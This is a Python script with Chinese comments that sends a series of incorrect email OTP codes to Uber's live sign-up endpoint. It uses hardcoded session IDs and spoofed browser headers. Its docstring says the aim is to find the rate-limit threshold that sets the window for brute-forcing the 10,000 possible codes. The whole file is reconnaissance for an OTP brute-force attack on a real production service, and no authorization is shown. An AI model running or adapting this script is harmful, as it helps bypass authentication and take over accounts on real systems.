"""限流窗口测试：同一 session 连续提交错误 OTP，观察错误类型何时变化
决定爆破窗口大小的关键数据：
  - 持续 EMAIL_OTP_INCORRECT -> 无限制（可爆破，但注意真实利用需要 10000 次）
  - 出现 rate limit / lockout 类错误 -> 记录阈值次数
"""
import sys, json, uuid, time, requests
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://cn-geo1.uber.com/rt/silk-screen"
SESSION = "ccbeb8ce-6c4d-47ef-971e-9e7d18c25450_de573c49-23d3-4293-b40c-99059ca5d00e"
USL_ID = "e78c5663-84e9-4af7-970c-9ac188575784"
ANALYTICS_SID = "8ea4f450-ce1a-43e3-9e86-54112f923140"

def headers():
    return {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://auth.uber.com",
        "referer": "https://auth.uber.com/",
        "sec-ch-ua": '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
        "x-uber-analytics-session-id": ANALYTICS_SID,
        "x-uber-client-name": "usl_desktop",
        "x-uber-marketing-id": USL_ID,
        "x-uber-request-uuid": str(uuid.uuid4()),
        "x-uber-usl-id": USL_ID,
    }

def otp_payload(otp_val, otp_width=None):
    sa = {"screenType": "EMAIL_OTP_CODE", "eventType": "TypeEmailOTP",
          "fieldAnswers": [{"fieldType": "EMAIL_OTP_CODE", "emailOTPCode": otp_val}]}
    if otp_width is not None:
        sa["otpWidth"] = otp_width
    return {"formContainerAnswer": {"inAuthSessionID": SESSION, "formAnswer": {
        "flowType": "SIGN_UP", "standardFlow": True, "accountManagementFlow": False,
        "daffFlow": False,
        "productConstraints": {"isEligibleForWebOTPAutofill": False, "uslFELibVersion": "",
                               "uslMobileLibVersion": "", "isWhatsAppAvailable": False,
                               "isPublicKeyCredentialSupported": True, "isFacebookAvailable": False,
                               "isRakutenAvailable": False, "isKakaoAvailable": False},
        "additionalParams": {"isEmailUpdatePostAuth": False},
        "deviceData": "AAAA",
        "nextURL": "https://m.uber.com", "uslURL": "https://auth.uber.com/v2/",
        "authDomain": "auth.uber.com",
        "screenAnswers": [sa]}}}

INTERVAL = 3   # 秒
TOTAL = 20     # 总尝试次数

for i in range(1, TOTAL + 1):
    otp = f"{i:04d}"
    try:
        r = requests.post(f"{BASE}/submit-form", json=otp_payload(otp), headers=headers(), timeout=15)
        # 提取错误类型
        err = ""
        try:
            j = r.json()
            if "screenErrors" in j:
                se = j["screenErrors"][0]["errors"]["EMAIL_OTP_CODE"]
                err = f"{se.get('errorType')}: {se.get('message', '')[:60]}"
            elif "errorType" in j:
                err = f"{j['errorType']}: {j.get('message', '')[:60]}"
            else:
                err = json.dumps(j, ensure_ascii=False)[:120]
        except Exception:
            err = r.text[:120]
        print(f"[{i:02d}] OTP={otp} -> {r.status_code} {err}")
        if r.status_code != 400 or "EMAIL_OTP_INCORRECT" not in r.text:
            print(f"    ^^^ 错误类型变化，标记阈值点 ^^^")
    except Exception as e:
        print(f"[{i:02d}] ERR {str(e)[:150]}")
    time.sleep(INTERVAL)

print("\n限流测试完成。")
